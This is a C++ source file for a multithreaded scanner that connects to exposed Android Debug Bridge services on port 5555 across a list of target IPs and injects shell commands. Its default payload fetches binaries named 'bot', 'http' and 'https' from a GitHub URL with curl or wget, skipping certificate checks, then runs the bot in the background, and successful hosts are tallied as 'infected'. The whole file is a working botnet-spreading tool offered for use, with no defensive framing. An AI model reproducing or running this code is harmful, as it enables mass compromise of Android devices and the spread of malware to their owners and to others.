#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <vector>
#include <string>
#include <iostream>
#include <fstream>
#include <atomic>

#define A_CNXN 0x4e584e43
#define A_AUTH 0x48545541
#define A_OPEN 0x4e45504f
#define A_OKAY 0x59414b4f
#define A_CLSE 0x45534c43
#define A_WRTE 0x45545257

#define ADB_VERSION 0x01000000
#define ADB_MAXDATA 4096

#pragma pack(push, 1)
struct adb_header
{
    uint32_t command;
    uint32_t arg0;
    uint32_t arg1;
    uint32_t data_length;
    uint32_t data_check;
    uint32_t magic;
};
#pragma pack(pop)

static std::atomic<uint32_t> total_scanned(0);
static std::atomic<uint32_t> total_connected(0);
static std::atomic<uint32_t> total_infected(0);

static uint32_t calc_checksum(const unsigned char *data, size_t len)
{
    uint32_t sum = 0;
    for (size_t i = 0; i < len; ++i)
    {
        sum += data[i];
    }
    return sum;
}

static int set_timeout(int fd, int sec)
{
    struct timeval tv;
    tv.tv_sec = sec;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof(tv));
    return setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, (const char *)&tv, sizeof(tv));
}

static int send_packet(int fd, uint32_t cmd, uint32_t arg0, uint32_t arg1, const void *data, uint32_t len)
{
    struct adb_header h;
    h.command = cmd;
    h.arg0 = arg0;
    h.arg1 = arg1;
    h.data_length = len;
    h.data_check = data && len ? calc_checksum((const unsigned char *)data, len) : 0;
    h.magic = cmd ^ 0xFFFFFFFF;

    if (write(fd, &h, sizeof(h)) != (ssize_t)sizeof(h))
    {
        return -1;
    }
    if (data && len > 0)
    {
        if (write(fd, data, len) != (ssize_t)len)
        {
            return -1;
        }
    }
    return 0;
}

static int read_packet(int fd, struct adb_header *h, std::vector<char> &body)
{
    size_t total = 0;
    char *hdr_ptr = (char *)h;
    while (total < sizeof(struct adb_header))
    {
        ssize_t r = read(fd, hdr_ptr + total, sizeof(struct adb_header) - total);
        if (r <= 0) return -1;
        total += r;
    }

    if (h->magic != (h->command ^ 0xFFFFFFFF))
    {
        return -1;
    }

    if (h->data_length > 65536)
    {
        return -1;
    }

    body.resize(h->data_length);
    if (h->data_length > 0)
    {
        total = 0;
        while (total < h->data_length)
        {
            ssize_t r = read(fd, body.data() + total, h->data_length - total);
            if (r <= 0) return -1;
            total += r;
        }
    }
    return 0;
}

static bool exploit_adb(const char *ip, int port, const std::string &command, int timeout_sec)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return false;

    set_timeout(fd, timeout_sec);

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &addr.sin_addr) <= 0)
    {
        close(fd);
        return false;
    }

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) != 0)
    {
        close(fd);
        return false;
    }

    total_connected++;

    // 1. Send CNXN
    const char *banner = "host::adbloader\0";
    if (send_packet(fd, A_CNXN, ADB_VERSION, ADB_MAXDATA, banner, strlen(banner) + 1) != 0)
    {
        close(fd);
        return false;
    }

    struct adb_header resp;
    std::vector<char> body;
    if (read_packet(fd, &resp, body) != 0)
    {
        close(fd);
        return false;
    }

    // Must be CNXN or OPEN response (AUTH indicates secured/unauthorized ADB)
    if (resp.command != A_CNXN)
    {
        close(fd);
        return false;
    }

    // 2. Open Shell Stream
    std::string service = "shell:" + command + "\0";
    uint32_t local_id = 1;
    if (send_packet(fd, A_OPEN, local_id, 0, service.c_str(), service.length() + 1) != 0)
    {
        close(fd);
        return false;
    }

    // 3. Wait for OKAY
    if (read_packet(fd, &resp, body) != 0)
    {
        close(fd);
        return false;
    }

    if (resp.command == A_OKAY)
    {
        total_infected++;
        close(fd);
        return true;
    }

    close(fd);
    return false;
}

struct WorkerConfig
{
    std::vector<std::string> targets;
    size_t start_idx;
    size_t end_idx;
    int port;
    std::string cmd;
    int timeout_sec;
};

static void *worker_thread(void *arg)
{
    WorkerConfig *cfg = (WorkerConfig *)arg;
    for (size_t i = cfg->start_idx; i < cfg->end_idx; ++i)
    {
        const std::string &target = cfg->targets[i];
        total_scanned++;
        if (exploit_adb(target.c_str(), cfg->port, cfg->cmd, cfg->timeout_sec))
        {
            printf("[+] Successfully injected: %s:%d\n", target.c_str(), cfg->port);
            fflush(stdout);
        }
    }
    return NULL;
}

static const char *DEFAULT_PAYLOAD = 
    "cd /data/local/tmp && "
    "(curl -s -k -L https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/bot -o bot || wget -q --no-check-certificate https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/bot -O bot) && "
    "(curl -s -k -L https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/http -o http || wget -q --no-check-certificate https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/http -O http) && "
    "(curl -s -k -L https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/https -o https || wget -q --no-check-certificate https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/https -O https) && "
    "(curl -s -k -L https://raw.githubusercontent.com/cloudflared9-hub/agent/main/agent.txt -o agent.txt || wget -q --no-check-certificate https://raw.githubusercontent.com/cloudflared9-hub/agent/main/agent.txt -O agent.txt) && "
    "chmod +x bot http https && "
    "nohup ./bot >/dev/null 2>&1 &";

int main(int argc, char **argv)
{
    if (argc < 3)
    {
        printf("Usage: %s <targets.txt> <threads> [\"payload_command\"|\"default\"] [port=5555] [timeout=5]\n", argv[0]);
        printf("Default payload downloads 'bot', 'http', 'https', 'agent.txt' from GitHub into /data/local/tmp and executes ./bot.\n");
        printf("Examples:\n");
        printf("  %s ips.txt 50 default 5555 5\n", argv[0]);
        printf("  %s ips.txt 50 \"cd /data/local/tmp; curl -kLO https://.../bot; chmod +x bot; ./bot &\"\n", argv[0]);
        return 1;
    }

    const char *file_path = argv[1];
    int threads_count = atoi(argv[2]);
    std::string payload_cmd = (argc >= 4 && strcmp(argv[3], "default") != 0) ? argv[3] : DEFAULT_PAYLOAD;
    int port = (argc >= 5) ? atoi(argv[4]) : 5555;
    int timeout_sec = (argc >= 6) ? atoi(argv[5]) : 5;

    std::ifstream infile(file_path);
    if (!infile.is_open())
    {
        fprintf(stderr, "[-] Error: cannot open file %s\n", file_path);
        return 1;
    }

    std::vector<std::string> targets;
    std::string line;
    while (std::getline(infile, line))
    {
        while (!line.empty() && (line.back() == '\r' || line.back() == '\n' || line.back() == ' '))
        {
            line.pop_back();
        }
        if (!line.empty() && line[0] != '#')
        {
            targets.push_back(line);
        }
    }
    infile.close();

    printf("[*] Loaded %zu targets.\n", targets.size());
    if (targets.empty())
    {
        return 0;
    }

    if (threads_count <= 0) threads_count = 1;
    if (threads_count > (int)targets.size()) threads_count = targets.size();

    pthread_t *threads = new pthread_t[threads_count];
    WorkerConfig *configs = new WorkerConfig[threads_count];

    size_t chunk = targets.size() / threads_count;
    size_t rem = targets.size() % threads_count;
    size_t current = 0;

    for (int i = 0; i < threads_count; ++i)
    {
        size_t count = chunk + (i < (int)rem ? 1 : 0);
        configs[i].targets = targets;
        configs[i].start_idx = current;
        configs[i].end_idx = current + count;
        configs[i].port = port;
        configs[i].cmd = payload_cmd;
        configs[i].timeout_sec = timeout_sec;
        current += count;

        pthread_create(&threads[i], NULL, worker_thread, &configs[i]);
    }

    for (int i = 0; i < threads_count; ++i)
    {
        pthread_join(threads[i], NULL);
    }

    printf("\n[*] Finished scan.\n");
    printf("[*] Total Scanned: %u\n", total_scanned.load());
    printf("[*] Open Ports:    %u\n", total_connected.load());
    printf("[*] Injected:      %u\n", total_infected.load());

    delete[] threads;
    delete[] configs;
    return 0;
}
